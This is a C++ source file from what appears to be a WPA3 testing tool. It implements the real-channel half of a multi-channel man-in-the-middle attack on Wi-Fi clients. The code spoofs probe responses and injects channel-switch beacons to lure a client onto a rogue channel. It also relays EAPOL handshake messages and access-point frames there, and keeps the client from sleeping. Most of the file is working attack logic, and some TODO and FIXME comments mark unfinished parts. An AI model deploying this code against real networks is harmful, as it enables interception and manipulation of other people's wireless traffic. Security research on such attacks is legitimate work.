#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"
#include <chrono>
#include <tins/tins.h>

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

void McMitm::send_to_real(PDU &pdu) const {
	sock_real->send(pdu, netconfig.real_channel);
}

void McMitm::send_to_real(const vector<uint8_t> &raw) const{
	sock_real->send(raw, netconfig.real_channel);
}

PProcess McMitm::handle_probe_real(const HWAddress<6> addr2, const Dot11 &dot11) const{
	if(dot11.find_pdu<Dot11ProbeRequest>()){
		probe_resp->addr1(addr2);
		RadioTap rt;
		rt.inner_pdu(probe_resp->clone());
		send_to_real(rt);
		display_traffic(dot11, "Real channel", " -- Replied");
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()){
		if(addr2 == ap.get(SK::mac)) display_traffic(dot11, "Real channel");
		return STOP;
	}
	return CONTINUE;
}

//FIXME change bool to PProcess::continue; PProcess::stop (with change to bool for

// not
PProcess McMitm::handle_auth_from_client_real(const HWAddress<6> addr1, const Dot11 &dot11){
	if(addr1 != ap.get(SK::mac)) return CONTINUE;
	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
		const auto client_addr = auth->addr2();
		display_traffic(dot11, "Real channel");

		if(client_state.get_mac() == client_addr) {
			log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
				client_addr);

			send_csa_beacon(1, client_addr);
			send_csa_beacon();

			client_state.update_state(ClientState::Sent_to_rogue);
			return STOP;
		}
	}
	return CONTINUE;
}

PProcess McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const vector<unsigned char> &raw,
								const Dot11 &dot11
) const{
	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return CONTINUE;
	if(dot11.wep()){
		if(addr2 == ap.get(SK::mac)){
			display_traffic(dot11, "Real channel", " -- MitM");
			send_to_rogue(raw);
			return STOP;
		}
	}

	const auto serialization = const_cast<Dot11&>(dot11).serialize();
	if(serialization.size() < 25) return CONTINUE;
	const uint8_t category = serialization[24];

	if(category == 0){
		log(LogLevel::DEBUG, "Dropping Action frame category=0 (Spectrum Management)");
		return STOP;
	}

	const HWAddress<6> src(serialization.data() + 10);
	const HWAddress<6> dst(serialization.data() + 4);

	if(src == ap.get(SK::mac) && client_state.get_mac() == dst){
		log(LogLevel::DEBUG, "Real channel: Action(cat={}) -> rogue channel", category);
		send_to_rogue(pdu);
		return STOP;
	}
	return CONTINUE;
}

PProcess McMitm::handle_eapol_real(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const{
	// EAPOL AP -> STA on real channel
	if(addr1 == sta.get(SK::mac) && addr2 == ap.get(SK::mac) && is_eapol(pdu)){
		int eapol_msg = get_eapol_msg_num(pdu);
		if(eapol_msg == 1 || eapol_msg == 3) {
			log(LogLevel::INFO, "Real channel: EAPOL {} AP -> STA", eapol_msg);
			send_to_rogue(pdu);
		}
		return STOP;
	}
	return CONTINUE;
}

void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11, const HWAddress<6> &addr1){
	// Beacon from real AP - update timestamp
	if(const auto *b = dot11.find_pdu<Dot11Beacon>()){
		const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
		if(ch_ie && ch_ie->data_size() != 0 && ch_ie->data_ptr()[0] == netconfig.real_channel.ch_num)
			last_real_beacon = steady_clock::now();
		return;
	}

	// AP -> client ?
	const bool might_forward = client_state.get_mac() == addr1 /*&& client_state.should_forward(*pdu)*/;

	//print
	if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>()){
		display_traffic(dot11, "Real channel", might_forward ? " -- MitM'ing" : "");
	} else if(might_forward){
		display_traffic(dot11, "Real channel", " -- MitM ap");
	}

	// Forward na rogue channel
	if(might_forward){
		// Auth(seq=2) from real AP must NOT be forwarded - rogue side already sent a synthetic
		// Auth(seq=2) in handle_open_auth. Forwarding it triggers a second assoc cycle at the
		// real AP ("Multiple EAP reauth attempts without 4-way handshake completion").
		if(const auto *auth = dot11.find_pdu<Dot11Authentication>(); auth && auth->auth_seq_number() == 2){
			log(LogLevel::DEBUG, "Real channel: dropping Auth(seq=2) relay to rogue (synthetic already sent)");
			return;
		}
		//client_state.modify_packet(*pdu);
		send_to_rogue(*pdu);
	}

	//FIXME this can get forwarded packets from rogue
	if(dot11.find_pdu<Dot11Deauthentication>())
		client_state.update_state(ClientState::Target);
}

void McMitm::power_mgmt_response(HWAddress<6> addr2, const Dot11 &dot11) const{
	if(dot11.addr1() == ap.get(SK::mac)){ // ->AP
		// Sleep mode detection for keep wake up
		if(dot11.power_mgmt() && client_state.get_mac() == addr2){
			log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
			Dot11Data null_frame(ap.get(SK::mac), addr2);
			null_frame.subtype(Dot11::DATA_NULL);
			null_frame.addr3(ap.get(SK::mac));
			sock_real->send(null_frame, netconfig.real_channel);
		}
	}
}

void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_t> &raw){
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.real_channel))
			return;
	}

	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	if(addr2 == HWAddress<6>() && dot11->type() != Dot11::CONTROL){
		log(LogLevel::DEBUG, "Real channel: Unknown frame type");
		return;
	}

	power_mgmt_response(addr2, *dot11);

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe_real(addr2, *dot11))
	//TODO if(handle_action_real(addr2, *pdu, raw, *dot11)) return;
	SOLVE_OR_CONTINUE(handle_eapol_real(addr1, addr2, *dot11))
	SOLVE_OR_CONTINUE(handle_auth_from_client_real(addr1, *dot11))
	#undef SOLVE_OR_CONTINUE

	if(dot11->addr1() == ap.get(SK::mac)){ // -> AP
		if(client_state.get_mac() == addr2) display_traffic(*dot11, "Real channel");
		// STA -> AP
		// This can catch packets what are not
		if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>())
			client_state.update_state(ClientState::Target_disconnected);
	} else if(addr2 == ap.get(SK::mac)){ // AP ->
		//TODO FIXME refactirion
		handle_from_ap_real(pdu, *dot11, addr1);
	}
}
}